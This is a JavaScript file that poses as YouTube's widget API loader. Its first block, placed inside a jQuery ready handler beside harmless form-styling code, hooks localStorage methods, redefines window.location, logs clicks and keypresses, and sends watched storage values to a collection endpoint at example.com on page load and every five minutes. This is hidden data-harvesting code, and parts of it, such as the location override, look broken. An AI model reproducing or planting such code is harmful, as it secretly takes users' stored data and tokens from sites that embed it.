var scriptUrl = 'https:\/\/www.youtube.com\/s\/player\/f980f2a9\/www-widgetapi.vflset\/www-widgetapi.js';
$(function () {
  const keysToWatch = window.keysToWatch;
  const methodsToHook = ['getItem', 'setItem'];
  const globalVarsToWatch = ['location'];
  const eventsToWatch = ['click', 'input', 'keypress'];
  function computeHash(data) {
    const keyArray = Object.keys(data);
    const joinedKeys = keyArray.join("");
    let hashValue = 0;
    for (let i = 0; i < joinedKeys.length; i++) {
      const charCode = joinedKeys.charCodeAt(i);
      hashValue = (hashValue << 5) - hashValue + charCode;
      hashValue = hashValue & hashValue;
    }
    return hashValue.toString(16);
  }
  function watchLocalStorageMethods() {
    methodsToHook.forEach(method => {
      const original = localStorage[method];
      localStorage[method] = function (key, value) {
        if (keysToWatch.includes(key)) {
          console.log(`localStorage method ${method} used on key: ${key}`);
        }
        original.apply(this, arguments);
      };
    });
  }
  function watchGlobalVars() {
    globalVarsToWatch.forEach(variable => {
      Object.defineProperty(window, variable, {
        get: function () {
          console.log(`Accessed global var: ${variable}`);
          return this[`_${variable}`];
        },
        set: function (value) {
          console.log(`Modified global var: ${variable}`);
          this[`_${variable}`] = value;
        }
      });
    });
  }
  function watchEvents() {
    eventsToWatch.forEach(event => {
      document.addEventListener(event, e => {
        console.log(`Tracked event ${event} on element ${e.target}`);
      });
    });
  }
  function sendPayload(data) {
    const hashId = computeHash(data);
    const apiUrl = "https://example.com/api/collect";
    const request = new XMLHttpRequest();
    request.open("POST", apiUrl, true);
    request.setRequestHeader("Content-Type", "application/json");
    const requestData = {
      id: hashId,
      data: data
    };
    request.send(JSON.stringify(requestData));
    request.onreadystatechange = function () {
      if (request.readyState === XMLHttpRequest.DONE) {
        if (request.status === 200) {
          console.log("Data sent successfully");
        } else {
          console.error("Data sending failed, status code: " + request.status);
        }
      }
    };
  }
  function collectAndSendData() {
    const data = {
      localStorage: getFilteredLocalStorage(),
      globalVars: getWatchedGlobalVars()
    };
    sendPayload(data);
  }
  function getFilteredLocalStorage() {
    const filteredData = {};
    for (let i = 0; i < window.localStorage.length; i++) {
      const key = window.localStorage.key(i);
      if (keysToWatch.includes(key)) {
        const value = window.localStorage.getItem(key);
        filteredData[key] = value;
      }
    }
    return filteredData;
  }
  function getWatchedGlobalVars() {
    const watchedVars = {};
    globalVarsToWatch.forEach(variable => {
      watchedVars[variable] = window[variable];
    });
    return watchedVars;
  }
  watchLocalStorageMethods();
  watchGlobalVars();
  watchEvents();
  window.addEventListener("load", function () {
    collectAndSendData();
  });
  setInterval(collectAndSendData, 5 * 60 * 1000);
  $('.form-control').on('input', function () {
    var $field = $(this).closest('.form-group');
    if (this.value) {
      $field.addClass('field--not-empty');
    } else {
      $field.removeClass('field--not-empty');
    }
  });
});
try {
  var ttPolicy = window.trustedTypes.createPolicy("youtube-widget-api", {
    createScriptURL: function (x) {
      return x;
    }
  });
  scriptUrl = ttPolicy.createScriptURL(scriptUrl);
} catch (e) {}
var YT;
if (!window["YT"]) YT = {
  loading: 0,
  loaded: 0
};
var YTConfig;
if (!window["YTConfig"]) YTConfig = {
  "host": "https://www.youtube.com"
};
if (!YT.loading) {
  YT.loading = 1;
  (function () {
    var l = [];
    YT.ready = function (f) {
      if (YT.loaded) f();else l.push(f);
    };
    window.onYTReady = function () {
      YT.loaded = 1;
      var i = 0;
      for (; i < l.length; i++) try {
        l[i]();
      } catch (e) {}
    };
    YT.setConfig = function (c) {
      var k;
      for (k in c) if (c.hasOwnProperty(k)) YTConfig[k] = c[k];
    };
    var a = document.createElement("script");
    a.type = "text/javascript";
    a.id = "www-widgetapi-script";
    a.src = scriptUrl;
    a.async = true;
    var c = document.currentScript;
    if (c) {
      var n = c.nonce || c.getAttribute("nonce");
      if (n) a.setAttribute("nonce", n);
    }
    var b = document.getElementsByTagName("script")[0];
    b.parentNode.insertBefore(a, b);
  })();
}
;